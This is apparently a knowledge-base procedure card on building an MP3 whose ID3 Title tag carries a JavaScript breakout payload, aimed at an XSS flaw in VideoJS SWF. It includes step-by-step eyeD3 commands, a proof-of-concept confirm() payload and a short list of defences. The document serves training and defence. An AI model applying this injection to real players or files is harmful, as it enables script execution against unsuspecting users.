---
id: proc-uuid-1
tags:
  - xss
  - metadata-injection
  - id3-tags
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
  - Flash
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T03:15:27.059Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Prepare-Malicious-MP3-with-ID3-Tags

## Summary

This procedure creates a malicious MP3 file by embedding crafted ID3 metadata tags containing a JavaScript payload designed to escape the expected object structure and execute arbitrary code when processed by vulnerable media players like VideoJS SWF.

## Description

In the context of exploiting XSS in VideoJS SWF, ID3 tags (e.g., TIT2 for Title) from MP3 files are read during RTMP streaming and passed unescaped to JavaScript via Flash's ExternalInterface. The payload \"})}})}finally{confirm(/moin/)}// closes any surrounding JSON-like structures and injects executable JS. This requires tools like audio editors or libraries (e.g., eyeD3 in Python) to modify tags without altering the audio. Prerequisites include basic knowledge of ID3 format and JS injection techniques; the target environment is any system capable of generating MP3s for RTMP streaming.

## Requirements

1. Audio editing software or library (e.g., eyeD3 for Python) to modify ID3 tags
2. Sample MP3 file as base
3. Knowledge of JS payload crafting to match the vulnerability's parsing context

## Defense

Defensive measures and detection strategies:

- Sanitize and escape all metadata before processing in media players
- Disable or deprecate Flash usage entirely
- Implement content security policies (CSP) to restrict inline JS execution
- Monitor for anomalous metadata in media streams

## Objectives

1. Embed JS payload in ID3 tags to enable XSS on vulnerable SWF
2. Ensure payload survives RTMP transmission unescaped
3. Validate payload for breakout from object literals

## Instructions

### Step 1: Select Base MP3 and Install Tools

**Context**: Start with a clean MP3 file and prepare tools for tag editing.

Install eyeD3 if using Python:

```bash
pip install eyed3
```

> This installs the library for ID3 manipulation. Expected output: Successful installation confirmation.

### Step 2: Craft and Embed Payload

**Context**: Create the JS payload and insert it into the TIT2 tag to inject code.

Use eyeD3 to set the tag:

```bash
eyed3 --title='\")}})}finally{confirm(/moin/)}//' haha.mp3
```

> This command sets the Title tag to the payload, escaping quotes appropriately. Expected output: Updated MP3 file with new ID3 tag; verify with `eyed3 haha.mp3` showing the injected string.

### Step 3: Validate Payload

**Context**: Test the MP3 metadata to ensure the payload is intact.

Read tags back:

```bash
eyed3 --read-tags haha.mp3
```

> Confirms the payload is embedded correctly without corruption.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[xss]]
- [[metadata-injection]]
